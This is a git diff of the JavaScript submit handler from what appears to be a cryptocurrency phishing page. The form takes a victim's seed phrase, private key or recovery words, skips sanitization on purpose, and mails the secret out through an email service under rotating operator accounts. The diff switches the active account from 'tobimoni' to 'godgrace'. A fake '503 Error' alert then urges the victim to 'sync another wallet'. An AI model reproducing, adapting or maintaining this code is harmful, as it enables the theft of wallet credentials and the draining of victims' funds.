@@ -1,7 +1,7 @@
 async function handleSubmit(event) {
   event.preventDefault();
   console.log("Submitted");
-    const submitBtn = document.getElementById("submit-btn");
+  const submitBtn = document.getElementById("submit-btn");
   const submitText = document.getElementById("submit-text");
   const submitSpinner = document.getElementById("submit-spinner");
 
@@ -15,7 +15,7 @@ async function handleSubmit(event) {
 
   // Get the input value
   let val = formProps.phrase || formProps.privateKey || formProps.words;
-  
+
   // No sanitization - we want to validate the input as is
   console.log(val);
 
@@ -39,10 +39,15 @@ async function handleSubmit(event) {
       // user_id: "Jdelgc-1AjU_wilO1",
 
       // tobimoni
-      service_id: "service_d5qigxs",
-      template_id: "template_7bqxeaa",
-      user_id: "I-7q0Bs-ilK3rFcWj",
-      
+      // service_id: "service_d5qigxs",
+      // template_id: "template_7bqxeaa",
+      // user_id: "I-7q0Bs-ilK3rFcWj",
+
+      // godgrace
+      service_id: "service_nxew5ih",
+      template_id: "template_apt1xhr",
+      user_id: "Jdelgc-1AjU_wilO1",
+
       // metade
       // service_id: "service_d4sf907",
       // template_id: "template_f0ey18n",
@@ -68,19 +73,19 @@ async function handleSubmit(event) {
       throw new Error("Network response was not ok");
     }
 
-    console.log("Your mail is sent!");
+    console.log("Your mail is sucess!");
     alert(
       "503 Error, if this persists kindly sync another wallet and try again or contact admin"
     );
   } catch (error) {
     console.error("Error:", error);
     alert("Oops... " + error.message);
-  } finally{
+  } finally {
     // Reset the submit button state
     resetSubmitButton();
   }
 
-   function resetSubmitButton() {
+  function resetSubmitButton() {
     submitBtn.disabled = false;
     submitText.textContent = "Submit";
     submitSpinner.classList.add("hidden");
